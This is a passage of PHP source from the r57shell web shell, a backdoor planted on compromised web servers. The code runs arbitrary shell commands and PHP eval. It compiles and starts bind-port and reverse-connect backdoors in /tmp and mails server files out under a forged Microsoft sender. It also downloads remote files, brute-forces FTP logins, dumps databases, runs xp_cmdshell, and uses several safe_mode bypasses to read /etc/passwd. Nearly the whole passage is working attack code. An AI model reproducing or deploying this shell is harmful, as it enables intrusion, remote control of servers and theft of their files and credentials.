echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
if(empty($c1)||empty($c2)) { die(); }
$f = '&lt;br&gt;';
$f .= base64_decode($c1);
$f .= base64_decode($c2);
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="mail")
 {
 $res = mail($_POST['to'],$_POST['subj'],$_POST['text'],"From: ".$POST['from']."\r\n");
 mr($language,$res);
 $_POST['cmd']="";
 }
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 {
 if(!$file=@fopen($_POST['loc_file'],"r")) { echo re($_POST['loc_file']); $_POST['cmd']=""; }
 else
  {
    $filename = @basename($_POST['loc_file']);
    $filedump = @fread($file,@filesize($_POST['loc_file']));
    fclose($file);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    $attach = array(
                    "name"=&gt;$filename,
                    "type"=&gt;$mime_type,
                    "content"=&gt;$filedump
                   );
    if(empty($_POST['subj'])) { $_POST['subj'] = 'file from r57shell'; }
    if(empty($_POST['from'])) { $_POST['from'] = 'billy@microsoft.com'; }
    $res = mailattach($_POST['to'],$_POST['from'],$_POST['subj'],$attach);
    mr($language,$res);
    $_POST['cmd']="";
  }
 }
if(!empty($_POST['cmd']) && $_POST['cmd'] == "find_text")
{
$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \''.$_POST['s_mask'].'\' | xargs grep -E \''.$_POST['s_text'].'\'';
}
if(!empty($_POST['cmd']) && $_POST['cmd']=="ch_")
 {
 switch($_POST['what'])
   {
   case 'own':
   @chown($_POST['param1'],$_POST['param2']);
   break;
   case 'grp':
   @chgrp($_POST['param1'],$_POST['param2']);
   break;
   case 'mod':
   @chmod($_POST['param1'],intval($_POST['param2'], 8));
   break;
   }
 $_POST['cmd']="";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mk")
 {
   switch($_POST['what'])
   {
     case 'file':
      if($_POST['action'] == "create")
       {
       if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],"w")) { echo ce($_POST['mk_name']); $_POST['cmd']=""; }
       else {
        fclose($file);
        $_POST['e_name'] = $_POST['mk_name'];
        $_POST['cmd']="edit_file";
        echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;".$lang[$language.'_text61']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
        }
       }
       else if($_POST['action'] == "delete")
       {
       if(unlink($_POST['mk_name'])) echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;".$lang[$language.'_text63']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
       $_POST['cmd']="";
       }
     break;
     case 'dir':
      if($_POST['action'] == "create"){
      if(mkdir($_POST['mk_name']))
       {
         $_POST['cmd']="";
         echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;".$lang[$language.'_text62']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
       }
      else { echo ce($_POST['mk_name']); $_POST['cmd']=""; }
      }
      else if($_POST['action'] == "delete"){
      if(rmdir($_POST['mk_name'])) echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;".$lang[$language.'_text64']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
      $_POST['cmd']="";
      }
     break;
   }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="edit_file" && !empty($_POST['e_name']))
 {
 if(!$file=@fopen($_POST['e_name'],"r+")) { $only_read = 1; @fclose($file); }
 if(!$file=@fopen($_POST['e_name'],"r")) { echo re($_POST['e_name']); $_POST['cmd']=""; }
 else {
 echo $table_up3;
 echo $font;
 echo "&lt;form name=save_file method=post&gt;";
 echo ws(3)."&lt;b&gt;".$_POST['e_name']."&lt;/b&gt;";
 echo "&lt;div align=center&gt;&lt;textarea name=e_text cols=121 rows=24&gt;";
 echo @htmlspecialchars(@fread($file,@filesize($_POST['e_name'])));
 fclose($file);
 echo "&lt;/textarea&gt;";
 echo "&lt;input type=hidden name=e_name value=".$_POST['e_name']."&gt;";
 echo "&lt;input type=hidden name=dir value=".$dir."&gt;";
 echo "&lt;input type=hidden name=cmd value=save_file&gt;";
 echo (!empty($only_read)?("&lt;br&gt;&lt;br&gt;".$lang[$language.'_text44']):("&lt;br&gt;&lt;br&gt;&lt;input type=submit name=submit value=\" ".$lang[$language.'_butt10']." \"&gt;"));
 echo "&lt;/div&gt;";
 echo "&lt;/font&gt;";
 echo "&lt;/form&gt;";
 echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
 exit();
 }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
 {
 $mtime = @filemtime($_POST['e_name']);
 if(!$file=@fopen($_POST['e_name'],"w")) { echo we($_POST['e_name']); }
 else {
 if($unix) $_POST['e_text']=@str_replace("\r\n","\n",$_POST['e_text']);
 @fwrite($file,$_POST['e_text']);
 @touch($_POST['e_name'],$mtime,$mtime);
 $_POST['cmd']="";
 echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;".$lang[$language.'_text45']."&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
 }
 }
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="C"))
{
 cf("/tmp/bd.c",$port_bind_bd_c);
 $blah = ex("gcc -o /tmp/bd /tmp/bd.c");
 @unlink("/tmp/bd.c");
 $blah = ex("/tmp/bd ".$_POST['port']." ".$_POST['bind_pass']." &");
 $_POST['cmd']="ps -aux | grep bd";
}
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="Perl"))
{
 cf("/tmp/bdpl",$port_bind_bd_pl);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/bdpl ".$_POST['port']." &");
 $_POST['cmd']="ps -aux | grep bdpl";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/back",$back_connect);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/back ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="C"))
{
 cf("/tmp/back.c",$back_connect_c);
 $blah = ex("gcc -o /tmp/backc /tmp/back.c");
 @unlink("/tmp/back.c");
 $blah = ex("/tmp/backc ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/dp",$datapipe_pl);
 $p2=which("perl");
 if(empty($p2)) $p2="perl";
 $blah = ex($p2." /tmp/dp ".$_POST['local_port']." ".$_POST['remote_host']." ".$_POST['remote_port']." &");
 $_POST['cmd']="ps -aux | grep dp";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="C"))
{
 cf("/tmp/dpc.c",$datapipe_c);
 $blah = ex("gcc -o /tmp/dpc /tmp/dpc.c");
 @unlink("/tmp/dpc.c");
 $blah = ex("/tmp/dpc ".$_POST['local_port']." ".$_POST['remote_port']." ".$_POST['remote_host']." &");
 $_POST['cmd']="ps -aux | grep dpc";
}
if (!empty($_POST['alias'])){ foreach ($aliases as $alias_name=&gt;$alias_cmd) { if ($_POST['alias'] == $alias_name){$_POST['cmd']=$alias_cmd;}}}
if (!empty($HTTP_POST_FILES['userfile']['name']))
{
if(isset($_POST['nf1']) && !empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }
else { $nfn = $HTTP_POST_FILES['userfile']['name']; }
@copy($HTTP_POST_FILES['userfile']['tmp_name'],
            $_POST['dir']."/".$nfn)
      or print("&lt;font color=orange face=Fixedsys&gt;&lt;div align=center&gt;Malesef gulum Buraya Y&#252;kleyemezsin ".$HTTP_POST_FILES['userfile']['name']."&lt;/div&gt;&lt;/font&gt;");
}
if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file']))
{
 switch($_POST['with'])
 {
 case wget:
 $_POST['cmd'] = which('wget')." ".$_POST['rem_file']." -O ".$_POST['loc_file']."";
 break;
 case fetch:
 $_POST['cmd'] = which('fetch')." -o ".$_POST['loc_file']." -p ".$_POST['rem_file']."";
 break;
 case lynx:
 $_POST['cmd'] = which('lynx')." -source ".$_POST['rem_file']." &gt; ".$_POST['loc_file']."";
 break;
 case links:
 $_POST['cmd'] = which('links')." -source ".$_POST['rem_file']." &gt; ".$_POST['loc_file']."";
 break;
 case GET:
 $_POST['cmd'] = which('GET')." ".$_POST['rem_file']." &gt; ".$_POST['loc_file']."";
 break;
 case curl:
 $_POST['cmd'] = which('curl')." ".$_POST['rem_file']." -o ".$_POST['loc_file']."";
 break;
 }
}
if(!empty($_POST['cmd']) && ($_POST['cmd']=="ftp_file_up" || $_POST['cmd']=="ftp_file_down"))
 {
 list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
 if(empty($ftp_port)) { $ftp_port = 21; }
 $connection = @ftp_connect ($ftp_server,$ftp_port,10);
 if(!$connection) { fe($language,0); }
 else
  {
  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }
  else
   {
   if($_POST['cmd']=="ftp_file_down") { if(chop($_POST['loc_file'])==$dir) { $_POST['loc_file']=$dir.(($windows)?('\\'):('/')).basename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);	}
   if($_POST['cmd']=="ftp_file_up")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);	}
   }
  }
 @ftp_close($connection);
 $_POST['cmd'] = "";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="ftp_brute")
 {
 list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
 if(empty($ftp_port)) { $ftp_port = 21; }
 $connection = @ftp_connect ($ftp_server,$ftp_port,10);
 if(!$connection) { fe($language,0); $_POST['cmd'] = ""; }
 else if(!$users=get_users()) { echo "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font color=orange face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;".$lang[$language.'_text96']."&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"; $_POST['cmd'] = ""; }
 @ftp_close($connection);
 }
echo $table_up3;
if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?("dir"):("ls -lia"); }
else if(empty($_POST['cmd'])&&$safe_mode){ $_POST['cmd']="safe_dir"; }
echo $font.$lang[$language.'_text1'].": &lt;b&gt;".$_POST['cmd']."&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;div align=center&gt;&lt;textarea name=report cols=121 rows=15&gt;";
if($safe_mode)
{
 switch($_POST['cmd'])
 {
 case 'safe_dir':
  $d=@dir($dir);
  if ($d)
   {
   while (false!==($file=$d-&gt;read()))
    {
     if ($file=="." || $file=="..") continue;
     @clearstatcache();
     list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
     if($windows){
     echo date("d.m.Y H:i",$mtime);
     if(@is_dir($file)) echo "  &lt;DIR&gt; "; else printf("% 7s ",$size);
     }
     else{
     $owner = @posix_getpwuid($uid);
     $grgid = @posix_getgrgid($gid);
     echo $inode." ";
     echo perms(@fileperms($file));
     printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
     echo date("d.m.Y H:i ",$mtime);
     }
     echo "$file\n";
    }
   $d-&gt;close();
   }
  else echo $lang[$language._text29];
 break;
 case 'safe_file':
  if(@is_file($_POST['file']))
   {
   $file = @file($_POST['file']);
   if($file)
    {
    $c = @sizeof($file);
    for($i=0;$i&lt;$c;$i++) { echo htmlspecialchars($file[$i]); }
    }
   else echo $lang[$language._text29];
   }
  else echo $lang[$language._text31];
  break;
  case 'test1':
  $ci = @curl_init("file://".$_POST['test1_file']."");
  $cf = @curl_exec($ci);
  echo $cf;
  break;
  case 'test2':
  @include($_POST['test2_file']);
  break;
  case 'test3':
  if(!isset($_POST['test3_port'])||empty($_POST['test3_port'])) { $_POST['test3_port'] = "3306"; }
  $db = @mysql_connect('localhost:'.$_POST['test3_port'],$_POST['test3_ml'],$_POST['test3_mp']);
  if($db)
   {
   if(@mysql_select_db($_POST['test3_md'],$db))
    {
     $sql = "DROP TABLE IF EXISTS temp_r57_table;";
     @mysql_query($sql);
     $sql = "CREATE TABLE `temp_r57_table` ( `file` LONGBLOB NOT NULL );";
     @mysql_query($sql);
     $sql = "LOAD DATA INFILE \"".$_POST['test3_file']."\" INTO TABLE temp_r57_table;";
     @mysql_query($sql);
     $sql = "SELECT * FROM temp_r57_table;";
     $r = @mysql_query($sql);
     while(($r_sql = @mysql_fetch_array($r))) { echo @htmlspecialchars($r_sql[0]); }
     $sql = "DROP TABLE IF EXISTS temp_r57_table;";
     @mysql_query($sql);
    }
    else echo "[-] ERROR! Can't select database";
   @mysql_close($db);
   }
  else echo "[-] ERROR! Can't connect to mysql server";
  break;
  case 'test4':
  if(!isset($_POST['test4_port'])||empty($_POST['test4_port'])) { $_POST['test4_port'] = "1433"; }
  $db = @mssql_connect('localhost,'.$_POST['test4_port'],$_POST['test4_ml'],$_POST['test4_mp']);
  if($db)
   {
   if(@mssql_select_db($_POST['test4_md'],$db))
    {
     @mssql_query("drop table r57_temp_table",$db);
     @mssql_query("create table r57_temp_table ( string VARCHAR (500) NULL)",$db);
     @mssql_query("insert into r57_temp_table EXEC master.dbo.xp_cmdshell '".$_POST['test4_file']."'",$db);
     $res = mssql_query("select * from r57_temp_table",$db);
     while(($row=@mssql_fetch_row($res)))
      {
      echo $row[0]."\r\n";
      }
    @mssql_query("drop table r57_temp_table",$db);
    }
    else echo "[-] ERROR! Can't select database";
   @mssql_close($db);
   }
  else echo "[-] ERROR! Can't connect to MSSQL server";
  break;
  case 'test5':
  if (@file_exists('/tmp/mb_send_mail')) @unlink('/tmp/mb_send_mail');
  $extra = "-C ".$_POST['test5_file']." -X /tmp/mb_send_mail";
  @mb_send_mail(NULL, NULL, NULL, NULL, $extra);
  $lines = file ('/tmp/mb_send_mail');
  foreach ($lines as $line) { echo htmlspecialchars($line)."\r\n"; }
  break;
  case 'test6':
  $stream = @imap_open('/etc/passwd', "", "");
  $dir_list = @imap_list($stream, trim($_POST['test6_file']), "*");
  for ($i = 0; $i &lt; count($dir_list); $i++) echo $dir_list[$i]."\r\n";
  @imap_close($stream);
  break;
  case 'test7':
  $stream = @imap_open($_POST['test7_file'], "", "");
  $str = @imap_body($stream, 1);
  echo $str;
  @imap_close($stream);
  break;
 }
}
else if(($_POST['cmd']!="php_eval")&&($_POST['cmd']!="mysql_dump")&&($_POST['cmd']!="db_query")&&($_POST['cmd']!="ftp_brute")){
 $cmd_rep = ex($_POST['cmd']);
 if($windows) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n"; }
 else { echo @htmlspecialchars($cmd_rep)."\n"; }}
if ($_POST['cmd']=="ftp_brute")
 {
 $suc = 0;
 foreach($users as $user)
  {
  $connection = @ftp_connect($ftp_server,$ftp_port,10);
  if(@ftp_login($connection,$user,$user)) { echo "[+] $user:$user - success\r\n"; $suc++; }
  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo "[+] $user:".strrev($user)." - success\r\n"; $suc++; } }
  @ftp_close($connection);
  }
 echo "\r\n-------------------------------------\r\n";
 $count = count($users);
 if(isset($_POST['reverse'])) { $count *= 2; }
 echo $lang[$language.'_text97'].$count."\r\n";
 echo $lang[$language.'_text98'].$suc."\r\n";
 }
if ($_POST['cmd']=="php_eval"){
 $eval = @str_replace("&lt;?","",$_POST['php_eval']);
 $eval = @str_replace("?&gt;","",$eval);
 @eval($eval);}
if ($_POST['cmd']=="mysql_dump")
 {
  if(isset($_POST['dif'])) { $fp = @fopen($_POST['dif_name'], "w"); }
  $sql = new my_sql();
  $sql-&gt;db   = $_POST['db'];
  $sql-&gt;host = $_POST['db_server'];
  $sql-&gt;port = $_POST['db_port'];
  $sql-&gt;user = $_POST['mysql_l'];
  $sql-&gt;pass = $_POST['mysql_p'];
  $sql-&gt;base = $_POST['mysql_db'];
  if(!$sql-&gt;connect()) { echo "[-] ERROR! Can't connect to SQL server"; }
  else if(!$sql-&gt;select_db()) { echo "[-] ERROR! Can't select database"; }
  else if(!$sql-&gt;dump($_POST['mysql_tbl'])) { echo "[-] ERROR! Can't create dump"; }
  else {
   if(empty($_POST['dif'])) { foreach($sql-&gt;dump as $v) echo $v."\r\n"; }
   else if($fp){ foreach($sql-&gt;dump as $v) @fputs($fp,$v."\r\n"); }
   else { echo "[-] ERROR! Can't write in dump file"; }
   }
 }
echo "&lt;/textarea&gt;&lt;/div&gt;";
echo "&lt;/b&gt;";
echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
echo "&lt;table width=100% cellpadding=0 cellspacing=0&gt;";
function up_down($id)
 {
 global $lang;
 global $language;
 return '&nbsp&lt;img src='.$_SERVER['PHP_SELF'].'?img=1 onClick="document.getElementById(\''.$id.'\').style.display = \'none\'; document.cookie=\''.$id.'=0;\';" title="'.$lang[$language.'_text109'].'"&gt;&lt;img src='.$_SERVER['PHP_SELF'].'?img=2 onClick="document.getElementById(\''.$id.'\').style.display = \'block\'; document.cookie=\''.$id.'=1;\';" title="'.$lang[$language.'_text110'].'"&gt;';
 }
function div($id)
 {
 if(isset($_COOKIE[$id]) && $_COOKIE[$id]==0) return '&lt;div id="'.$id.'" style="display: none;"&gt;';
 return '&lt;div id="'.$id.'"&gt;';
 }
if(!$safe_mode){
echo $fs.$table_up1.$lang[$language.'_text2'].up_down('id1').$table_up2.div('id1').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text3'].$arrow."&lt;/b&gt;",in('text','cmd',85,''));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text4'].$arrow."&lt;/b&gt;",in('text','dir',85,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
else{
echo $fs.$table_up1.$lang[$language.'_text28'].up_down('id2').$table_up2.div('id2').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text4'].$arrow."&lt;/b&gt;",in('text','dir',85,$dir).in('hidden','cmd',0,'safe_dir').ws(4).in('submit','submit',0,$lang[$language.'_butt6']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
echo $fs.$table_up1.$lang[$language.'_text42'].up_down('id3').$table_up2.div('id3').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text43'].$arrow."&lt;/b&gt;",in('text','e_name',85,$dir).in('hidden','cmd',0,'edit_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt11']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
if($safe_mode){
echo $fs.$table_up1.$lang[$language.'_text57'].up_down('id4').$table_up2.div('id4').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text58'].$arrow."&lt;/b&gt;",in('text','mk_name',54,(!empty($_POST['mk_name'])?($_POST['mk_name']):("new_name"))).ws(4)."&lt;select name=action&gt;&lt;option value=create&gt;".$lang[$language.'_text65']."&lt;/option&gt;&lt;option value=delete&gt;".$lang[$language.'_text66']."&lt;/option&gt;&lt;/select&gt;".ws(3)."&lt;select name=what&gt;&lt;option value=file&gt;".$lang[$language.'_text59']."&lt;/option&gt;&lt;option value=dir&gt;".$lang[$language.'_text60']."&lt;/option&gt;&lt;/select&gt;".in('hidden','cmd',0,'mk').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt13']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if($safe_mode && $unix){
echo $fs.$table_up1.$lang[$language.'_text67'].up_down('id5').$table_up2.div('id5').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text68'].$arrow."&lt;/b&gt;","&lt;select name=what&gt;&lt;option value=mod&gt;CHMOD&lt;/option&gt;&lt;option value=own&gt;CHOWN&lt;/option&gt;&lt;option value=grp&gt;CHGRP&lt;/option&gt;&lt;/select&gt;".ws(2)."&lt;b&gt;".$lang[$language.'_text69'].$arrow."&lt;/b&gt;".ws(2).in('text','param1',40,(($_POST['param1'])?($_POST['param1']):("filename"))).ws(2)."&lt;b&gt;".$lang[$language.'_text70'].$arrow."&lt;/b&gt;".ws(2).in('text','param2 title="'.$lang[$language.'_text71'].'"',26,(($_POST['param2'])?($_POST['param2']):("0777"))).in('hidden','cmd',0,'ch_').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if(!$safe_mode){
foreach ($aliases as $alias_name=&gt;$alias_cmd)
 {
 $aliases2 .= "&lt;option&gt;$alias_name&lt;/option&gt;";
 }
echo $fs.$table_up1.$lang[$language.'_text7'].up_down('id6').$table_up2.div('id6').$ts;
echo sr(15,"&lt;b&gt;".ws(9).$lang[$language.'_text8'].$arrow.ws(4)."&lt;/b&gt;","&lt;select name=alias&gt;".$aliases2."&lt;/select&gt;".in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
echo $fs.$table_up1.$lang[$language.'_text54'].up_down('id7').$table_up2.div('id7').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text52'].$arrow."&lt;/b&gt;",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text53'].$arrow."&lt;/b&gt;",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"&lt;b&gt;".$lang[$language.'_text55'].$arrow."&lt;/b&gt;",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')."* ( .txt;.php;.htm )".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
if(!$safe_mode && $unix){
echo $fs.$table_up1.$lang[$language.'_text76'].up_down('id8').$table_up2.div('id8').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text72'].$arrow."&lt;/b&gt;",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text73'].$arrow."&lt;/b&gt;",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"&lt;b&gt;".$lang[$language.'_text74'].$arrow."&lt;/b&gt;",in('text','s_mask',85,'*.[hc]').ws(1).$lang[$language.'_text75'].in('hidden','cmd',0,'find_text').in('hidden','dir',0,$dir));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
echo $fs.$table_up1.$lang[$language.'_text32'].up_down('id9').$table_up2.$font;
echo "&lt;div align=center&gt;".div('id9')."&lt;textarea name=php_eval cols=100 rows=3&gt;";
echo (!empty($_POST['php_eval'])?($_POST['php_eval']):("/* delete script */\r\n//unlink(\"r57shell.php\");\r\n//readfile(\"/etc/passwd\");"));
echo "&lt;/textarea&gt;";
echo in('hidden','dir',0,$dir).in('hidden','cmd',0,'php_eval');
echo "&lt;br&gt;".ws(1).in('submit','submit',0,$lang[$language.'_butt1']);
echo "&lt;/div&gt;&lt;/div&gt;&lt;/font&gt;";
echo $table_end1.$fe;
if($safe_mode&&$curl_on)
{
echo $fs.$table_up1.$lang[$language.'_text33'].up_down('id10').$table_up2.div('id10').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['test1_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if($safe_mode)
{
echo $fs.$table_up1.$lang[$language.'_text34'].up_down('id11').$table_up2.div('id11').$ts;
echo "&lt;table class=table1 width=100% align=center&gt;";
echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['test2_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if($safe_mode&&$mysql_on)
{
echo $fs.$table_up1.$lang[$language.'_text35'].up_down('id12').$table_up2.div('id12').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text36'].$arrow."&lt;/b&gt;",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3_md']):("mysql"))).ws(4)."&lt;b&gt;".$lang[$language.'_text37'].$arrow."&lt;/b&gt;".in('text','test3_ml',15,(!empty($_POST['test3_ml'])?($_POST['test3_ml']):("root"))).ws(4)."&lt;b&gt;".$lang[$language.'_text38'].$arrow."&lt;/b&gt;".in('text','test3_mp',15,(!empty($_POST['test3_mp'])?($_POST['test3_mp']):("password"))).ws(4)."&lt;b&gt;".$lang[$language.'_text14'].$arrow."&lt;/b&gt;".in('text','test3_port',15,(!empty($_POST['test3_port'])?($_POST['test3_port']):("3306"))));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test3_file',96,(!empty($_POST['test3_file'])?($_POST['test3_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test3').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if($safe_mode&&$mssql_on)
{
echo $fs.$table_up1.$lang[$language.'_text85'].up_down('id13').$table_up2.div('id13').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text36'].$arrow."&lt;/b&gt;",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4_md']):("master"))).ws(4)."&lt;b&gt;".$lang[$language.'_text37'].$arrow."&lt;/b&gt;".in('text','test4_ml',15,(!empty($_POST['test4_ml'])?($_POST['test4_ml']):("sa"))).ws(4)."&lt;b&gt;".$lang[$language.'_text38'].$arrow."&lt;/b&gt;".in('text','test4_mp',15,(!empty($_POST['test4_mp'])?($_POST['test4_mp']):("password"))).ws(4)."&lt;b&gt;".$lang[$language.'_text14'].$arrow."&lt;/b&gt;".in('text','test4_port',15,(!empty($_POST['test4_port'])?($_POST['test4_port']):("1433"))));
echo sr(15,"&lt;b&gt;".$lang[$language.'_text3'].$arrow."&lt;/b&gt;",in('text','test4_file',96,(!empty($_POST['test4_file'])?($_POST['test4_file']):("dir"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test4').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if($safe_mode&&$unix&&function_exists('mb_send_mail')){
echo $fs.$table_up1.$lang[$language.'_text112'].up_down('id22').$table_up2.div('id22').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text30'].$arrow."&lt;/b&gt;",in('text','test5_file',96,(!empty($_POST['test5_file'])?($_POST['test5_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test5').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if($safe_mode&&function_exists('imap_list')){
echo $fs.$table_up1.$lang[$language.'_text113'].up_down('id23').$table_up2.div('id23').$ts;
echo sr(15,"&lt;b&gt;".$lang[$language.'_text4'].$arrow."&lt;/b&gt;",in('text','test6_file',96,(!empty($_POST['test6_file'])?($_POST['test6_file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test6').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'&lt;/div&gt;'.$table_end1.$fe;
}
if($safe_mode&&function_exists('imap_body')){
echo $fs.$table_up1.$lang[$language.'_text114'].up_down('id24').$table_up2.div('id24').$ts;
